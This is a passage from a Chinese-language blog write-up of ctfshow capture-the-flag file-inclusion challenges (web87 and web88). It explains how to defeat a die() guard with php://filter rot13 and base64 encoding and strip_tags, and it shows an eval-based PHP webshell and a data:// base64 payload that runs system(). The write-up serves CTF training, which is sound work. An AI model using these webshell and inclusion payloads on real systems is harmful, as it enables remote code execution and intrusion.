class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br></pre></td></tr></table></figure>

<p>将一句话木马进行 rot13 解码后传入 </p>
<p>content&#x3D;&lt;?cuc @riny($_TRG[‘pzq’]);?&gt;</p>
<p>方法是一样的，主要是编码方式不一样，最终还是依靠编码去使die()函数exit掉</p>
<p><strong>但这道题主要是前面短标签的 php 代码 &lt;?cuc qvr(‘大佬别秀了’);?&gt; 无法被识别，但是后面的 <code>&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt; </code>可以正常执行，总的来说这种方法适用于未开启短标签的情况。</strong></p>
<h3 id="通过-strip-tags-函数去除-XML-标签"><a href="#通过-strip-tags-函数去除-XML-标签" class="headerlink" title="通过 strip_tags 函数去除 XML 标签"></a>通过 strip_tags 函数去除 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020">XML</a> 标签</h3><p>&lt;?php die(); ?&gt; 实际上就是一个 XML 标签，我们可以通过 strip_tags 函数去除它。</p>
<h4 id="strip-tags函数"><a href="#strip-tags函数" class="headerlink" title="strip_tags函数"></a>strip_tags函数</h4><p>是一个在PHP中非常有用的内置函数，其主要功能是去除字符串中的HTML和PHP标签，确保输出到浏览器的内容是安全的</p>
<p>strip_tags()函数用于剥去字符串中的HTML、XML以及PHP的标签。它接受一个字符串作为输入，并返回该字符串的一个版本，其中所有的HTML和PHP标签（除非在可选参数中指定了允许保留的标签）都被移除。</p>
<p>具体用法:</p>
<p>strip_tags(string $str [, string $allowable_tags &#x3D; null ]): string</p>
<p>但是我们传入的一句话木马也是 XML 标签，如何让它只去除 &lt;?php die(); ?&gt; 而不破坏我们传入的木马呢？我们可以先对一句话木马进行 base64 编码后传入，这样就不会受到 strip_tags 函数的影响，当去除掉 &lt;?php die(); ?&gt; 后，由于 php:&#x2F;&#x2F;filter 允许使用多个过滤器，我们再调用 base64-decode 将一句话木马进行 base64 解码，实现还原。</p>
<p>这个做法没试过，你们可以试一下</p>
<h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><p>很经典的一道文件包含题哈</p>
<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730394008762-1f4d5086-c564-4870-bd5c-4a07dfd049ad.png" alt="img"></p>
<p>这里过滤了php,~,!,@,#,$,%,^,&amp;,*,(,),-,+,&#x3D;,.键盘顶上的符号全部被过滤了</p>
<p>然后我用了日志注入，php:&#x2F;&#x2F;filter伪协议和php:&#x2F;&#x2F;input伪协议发现都不能很好的绕过这些验证，这时候我们先找找哪些字符是可用的，从这些字符里面寻找做题思路</p>
<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730394986525-f1c33433-17cf-46fd-b824-e04ae1a7c1ed.png" alt="img"></p>
<p>利用data伪协议，同时进行base64加密，由于过滤了&#x3D;，所以可以在构造的 命令中添加上空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgICAgIHN5c3RlbSgndGFjIGZsMGcucGhwJyk7</span><br></pre></td></tr></table></figure>

<p>主要是data协议构造base64的时候必须要求不含&#x3D;和+号，多试几次构造一下，在结尾?&gt;后添加字符消除&#x3D;</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">H0me</a></li>
        
          <li><a href="/about/">A6out</a></li>
        
          <li><a href="/tags/">T6gs</a></li>
        
          <li><a href="/categories/">Catagory</a></li>
        
          <li><a href="/links/">L1nks</a></li>
        
          <li><a href="/search/">s4arch</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">0x02题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web78"><span class="toc-number">1.1.</span> <span class="toc-text">web78</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#data-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">data:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-number">1.1.2.</span> <span class="toc-text">php:&#x2F;&#x2F;input</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web79"><span class="toc-number">1.2.</span> <span class="toc-text">web79</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%B9%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">php之&lt;?&#x3D; ?&gt;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%87%E7%94%A8%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">采用大小写绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web80"><span class="toc-number">1.3.</span> <span class="toc-text">web80</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web81"><span class="toc-number">1.4.</span> <span class="toc-text">web81</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.4.1.</span> <span class="toc-text">#日志文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web82"><span class="toc-number">1.5.</span> <span class="toc-text">web82</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.1.</span> <span class="toc-text">session文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Session%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">Session的工作原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">利用session.upload_progress进行文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BAsession%E6%96%87%E4%BB%B6%E5%91%A2%E3%80%82"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">如何创建session文件呢。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%90%8E%EF%BC%8Csession%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E7%AB%8B%E5%8D%B3%E6%B8%85%E7%A9%BA%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E6%83%B3%E5%8A%9E%E6%B3%95%E6%8A%8Asession%E7%95%99%E5%9C%A8%E9%87%8C%E9%9D%A2%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E8%A6%81%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%8C%E5%9C%A8session%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%B8%85%E7%A9%BA%E5%89%8D%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%E3%80%82"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">默认配置导致文件上传后，session文件内容立即清空，所以我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%80%9F%E5%8A%A9Burp-Suite"><span class="toc-number">1.5.1.5.</span> <span class="toc-text">方法一 | 借助Burp Suite</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.5.2.</span> <span class="toc-text">条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">产生条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8PHP-SESSION-UPLOAD-PROGRESS%E5%8A%A0%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.3.</span> <span class="toc-text">利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web83"><span class="toc-number">1.6.</span> <span class="toc-text">web83</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">1.6.1.</span> <span class="toc-text">用脚本:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web84"><span class="toc-number">1.7.</span> <span class="toc-text">web84</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web85"><span class="toc-number">1.8.</span> <span class="toc-text">web85</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-get-contents-%E5%87%BD%E6%95%B0"><span class="toc-number">1.8.1.</span> <span class="toc-text">file_get_contents()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strpos-%E5%87%BD%E6%95%B0"><span class="toc-number">1.8.2.</span> <span class="toc-text">strpos()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web86"><span class="toc-number">1.9.</span> <span class="toc-text">web86</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web87"><span class="toc-number">1.10.</span> <span class="toc-text">web87</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter-%E6%B5%81%E7%9A%84-base64-decode-%E6%96%B9%E6%B3%95"><span class="toc-number">1.10.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter 流的 base64-decode 方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-rot13-%E7%BC%96%E7%A0%81%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.</span> <span class="toc-text">通过 rot13 编码实现绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-strip-tags-%E5%87%BD%E6%95%B0%E5%8E%BB%E9%99%A4-XML-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.10.3.</span> <span class="toc-text">通过 strip_tags 函数去除 XML 标签</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#strip-tags%E5%87%BD%E6%95%B0"><span class="toc-number">1.10.3.1.</span> <span class="toc-text">strip_tags函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web88"><span class="toc-number">1.11.</span> <span class="toc-text">web88</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&text=web入门文件包含篇-ctfshow"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&is_video=false&description=web入门文件包含篇-ctfshow"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=web入门文件包含篇-ctfshow&body=Check out this article: https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&name=web入门文件包含篇-ctfshow&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&t=web入门文件包含篇-ctfshow"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        
<footer id="footer">
    <div class="footer-left">
        Copyright ©
        
        
        2024-2025
        wanTh3flag
        <br>
    </div>
    
    <div class="footer-right">
        <nav>
            <ul>
                <!--
                --><li><a href="/">H0me</a></li><!--
                --><!--
                --><li><a href="/about/">A6out</a></li><!--
                --><!--
                --><li><a href="/tags/">T6gs</a></li><!--
                --><!--
                --><li><a href="/categories/">Catagory</a></li><!--
                --><!--
                --><li><a href="/links/">L1nks</a></li><!--
                --><!--
                --><li><a href="/search/">s4arch</a></li><!--
                -->
            </ul>
            <ul>
                
                <!-- 不蒜子统计 -->
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
                <span class="post-meta-divider">|</span>
                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
                
            </ul>
        </nav>
    </div>
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
